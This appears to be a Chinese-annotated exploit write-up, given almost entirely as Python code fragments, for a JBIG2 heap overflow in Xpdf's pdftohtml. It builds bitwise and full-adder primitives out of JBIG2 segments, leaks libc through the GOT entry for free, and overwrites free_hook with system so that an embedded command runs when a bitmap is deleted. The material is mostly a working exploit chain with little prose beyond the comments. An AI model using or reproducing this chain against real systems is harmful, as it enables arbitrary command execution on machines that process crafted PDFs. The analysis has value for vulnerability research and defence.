SymbolDict17-32; // 16 个 SymbolDict 的 size，一个 SymbolDict 的 size 为 0x40 字节
size=64 的 global GList backing store; // 此时的 Glist size 为 GLIST_DATA_SIZE
pageBitmap JBIG2Bitmap 结构体 // 这里还需要覆写 vtble + segNum + w + h + line，共24字节
 
// high address -------------------------------------------
```



```
size_to_overflow = (
 ptmalloc_chunk_size(syms_size)
 # 40: sizeof(JBIG2SymbolDict); there are (glist_capacity // 2) irrelevant JBIG2SymbolDict-s
 + ptmalloc_chunk_size(40) * (glist_capacity // 2)
 + ptmalloc_chunk_size(GLIST_DATA_SIZE)
 # Current page JBIG2Bitmap
 # vtbl(8)
 + 8
 # segNum(4), w(4), h(4), line(4)
 + 4 * 4
)
```



```
# Take back the free-d syms, hold it to prevent potential crash.
GenericRegion(103, imm=False, bitmap=Bitmap(8, syms_size)),
```



```
page_bitmap_buf_to_class_offset = (
 ptmalloc_chunk_size(GLIST_DATA_SIZE // 4)
 + ptmalloc_chunk_size(40) * (glist_capacity // 4)
 + size_to_overflow
 - 4 * 4
 - 8
)
```



```
# Overwrite pageBitmap->w, h and line
GenericRegion(
 104,
 x=(page_bitmap_buf_to_class_offset + 12) * 8,
 y=0,
 comb_op=CombOp.Replace,
 # (x, y) -> mem[(y << 24) | (x >> 3)] >> (7 - (x & 7)), max 48-bit addressing
 bitmap=Bitmap(struct.pack("<III", 2 ** 27, 2 ** 24, 2 ** 24)),
 imm=True,
),
```



```
+------------------> w=2^27 bit
|
|
|
|
|
|
V h=2^24 bit
```



```
# 16 "variables". Since we can only do bitwise operations relative to page bitmap
# with Refinement regions, we need these variables for peeking other absolute
# addresses, and also rebase the page bitmap in one segment command.
SymbolDict(105, [Bitmap(64, 1)] * 16)
```



```
class BitSeg:
 _seq = itertools.count(10000)

 def __init__(self, seg_num):
 self.seg_num = seg_num
 self.__consumed = False

 def consume(self):
 assert not self.__consumed
 self.__consumed = True
 return self.seg_num

 @classmethod
 def from_page(cls, offset):
 x, y = offset % 2 ** 27, offset // 2 ** 27
 idx = next(cls._seq)
 page0.append(ReadoutRefinement(idx, x=x, y=y, imm=False))
 return cls(idx)

class CombOp(enum.IntEnum):
 Or = 0
 And = 1
 Xor = 2
 Xnor = 3
 Replace = 4
 
def bitop(oa, ob, op: CombOp):
 b = BitSeg.from_page(ob)
 x, y = oa % 2 ** 27, oa // 2 ** 27
 page0.append(
 ReadoutRefinement(65536, x=x, y=y, imm=True, ref=b.consume(), comb_op=op)
 )
```



```
bitwise_mov = lambda a, b: bitop(a, b, CombOp.Replace)
bitwise_xor = lambda a, b: bitop(a, b, CombOp.Xor)
bitwise_and = lambda a, b: bitop(a, b, CombOp.And)
bitwise_or = lambda a, b: bitop(a, b, CombOp.Or)

def op_q_q(oa, ob, op: CombOp):
 for i in range(64):
 bitop(oa * 8 + i, ob * 8 + i, op)

# Offsets are in bytes.
mov_q_q = lambda a, b: op_q_q(a, b, CombOp.Replace)
xor_q_q = lambda a, b: op_q_q(a, b, CombOp.Xor)
and_q_q = lambda a, b: op_q_q(a, b, CombOp.And)
or_q_q = lambda a, b: op_q_q(a, b, CombOp.Or)
```



```
# Don't worry, Libra won't hu^W^W^W Xpdf allocates 1 more byte
adder_buf_offset = GLIST_DATA_SIZE // 4 * 8 # 1024

def add_q_q(oa, ob):
 oa, ob = oa * 8, ob * 8
 ab_xor, ab_and, carry, ab_xor_c_and, zero = range(
 adder_buf_offset, adder_buf_offset + 5
 )
 # 初始时，最低位全加器的进位标志为0
 bitwise_mov(carry, zero)
 # 8字节 = 64 位，因此这里的 range 为 64
 for i in range(64):
 # 这里是每个 **位** 的全加器，一个全加器由两个半加器构成
 a_bit_offset = oa + i // 8 * 8 + (7 - i % 8)
 b_bit_offset = ob + i // 8 * 8 + (7 - i % 8)
 # This is a naive full-adder. Applying TIS-100 skill could cut 3~4 ops maybe.
 # 首先是第一个半加器
 bitwise_mov(ab_xor, a_bit_offset)
 bitwise_xor(ab_xor, b_bit_offset)
 bitwise_mov(ab_and, a_bit_offset)
 bitwise_and(ab_and, b_bit_offset)
 # 其次是第二个半加器
 bitwise_mov(a_bit_offset, ab_xor)
 bitwise_xor(a_bit_offset, carry) # output (S)
 bitwise_mov(ab_xor_c_and, ab_xor)
 bitwise_and(ab_xor_c_and, carry)
 # 设置进位标志
 bitwise_mov(carry, ab_and)
 bitwise_or(carry, ab_xor_c_and)
```



```
def op_q_imm(offset, imm, op):
 offset *= 8
 x, y = offset % 2 ** 27, offset // 2 ** 27
 page0.append(
 GenericRegion(
 233, x=x, y=y, comb_op=op, bitmap=Bitmap(struct.pack("<Q", imm)), imm=True
 )
 )

mov_q_imm = lambda o, imm: op_q_imm(o, imm, CombOp.Replace)
xor_q_imm = lambda o, imm: op_q_imm(o, imm, CombOp.Xor)
and_q_imm = lambda o, imm: op_q_imm(o, imm, CombOp.And)
or_q_imm = lambda o, imm: op_q_imm(o, imm, CombOp.Or)
```



```
def rebase_variable_q(idx, addr_page_offset):
 mov_q_q(
 variable_bitmap_offset + idx * ptmalloc_chunk_size(0x20) + 0x18,
 addr_page_offset,
 )
```



```
def load_variable(to_page_offset, idx):
 to_page_offset *= 8
 x, y = to_page_offset % 2 ** 27, to_page_offset // 2 ** 27
 page0.append(
 TextRegion(
 233,
 x=x,
 y=y,
 w=64,
 h=1,
 imm=True,
 instances=[idx],
 ref_symbol_cnt=16,
 ref_segs=[105],
 )
 )
```



```
// low address .....
...
SymbolDict3-8;
pageBitmap backing buffer // size=16 的 global GList backing store 堆空洞
SymbolDict9-16;
...
// high address .....
```



```
# vtbl of a JBIG2SymbolDict adajacent to page bitmap buffer
# 取出vtbl地址放到+0处
mov_q_q(0, ptmalloc_chunk_size(GLIST_DATA_SIZE // 4))
```



```
# 计算出-vtbl_offset + free_got_offset
mov_q_imm(
 8, (-PDFTOHTML_VTBL_JBIG2SYMBOLDICT_OFFSET + PDFTOHTML_FREE_GOT_OFFSET) % 2 ** 64
)
```



```
# 计算vtbl地址+(-vtbl_offset + free_got_offset)得到free_got的地址，放到+0处
add_q_q(0, 8)
```



```
# 从+0处取出free_got的地址，放到第0个"变量"data 指针处
rebase_variable_q(0, 0)
# 取出存放在第0个"变量"里的值（此时该值为 libc.free 的绝对地址），放到+8处
load_variable(8, 0) # address of libc.free at +8
```



```
# 把LIBC_FREE_OFFSET这个立即数的值放到+0处
mov_q_imm(0, -LIBC_FREE_OFFSET % 2 ** 64)
# 计算free_got的地址+(-libc_free_offset)，得到libc基地址，放到+8处
add_q_q(8, 0)
# 复制+8处存放的libc基地址至+0处
mov_q_q(0, 8)
# 把LIBC_FREE_HOOK_OFFSET这个立即数放到+16处
mov_q_imm(16, LIBC_FREE_HOOK_OFFSET)
# 计算出libc基地址+LIBC_FREE_HOOK_OFFSET,即free_hook的绝对地址，放到+0处
add_q_q(0, 16)
# 取出system的偏移这个立即数，放到+16处
mov_q_imm(16, LIBC_SYSTEM_OFFSET)
# 计算出system的绝对地址，放到+8处
add_q_q(8, 16)
```



```
+0: free_hook_address +8: libc_system_address
```



```
# 取出pagebitmap的data指针，放到+24处
mov_q_q(24, page_bitmap_buf_to_data_ptr)
# 把立即数8放到+16处
mov_q_imm(16, 8)
# 将data指针加上8，并将结果放到+24处
add_q_q(24, 16)
```



```
# 取出pagebitmap的data指针的值放到第0个变量的 data 字段
rebase_variable_q(0, page_bitmap_buf_to_data_ptr)
# 取出data指针+8的值，放到第1个变量的 data 字段
rebase_variable_q(1, 24)
# 取出第0个变量的值，放到data指针处, 这一步会修改 data 指针为 free_hook_address
load_variable(page_bitmap_buf_to_data_ptr, 0)
# 取出第1个变量的值（也就是 libc_system_address），放到+0处，也就是 free_hook 基地址上的那个指针值
# 这样就完成了改写 free hook 的操作
load_variable(0, 1)
```



```
page0.append(
 GenericRegion(233, x=64, y=0, comb_op=CombOp.And, bitmap=Bitmap(COMMAND_TO_RUN))
)
```



```
void JBIG2Stream::readGenericRegionSeg(Guint segNum, GBool imm,
 GBool lossless, Guint length)
{
 [...];
 // read the bitmap
 bitmap = readGenericBitmap(mmr, w, h, templ, tpgdOn, gFalse,
 NULL, atx, aty, mmr ? length - 18 : 0);

 // combine the region bitmap into the page bitmap
 if (imm)
 {
 if (pageH == 0xffffffff && y + h > curPageH)
 {
 pageBitmap->expand(y + h, pageDefPixel);
 }
 pageBitmap->combine(bitmap, x, y, extCombOp);
 // 在这里触发 system
 delete bitmap;

 // store the region bitmap
 }
 [...]
}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/02/2-1644590600.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/02/7-1644590600.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/02/7-1644590600-1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/02/0-1644590601.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/02/1-1644590601.jpeg)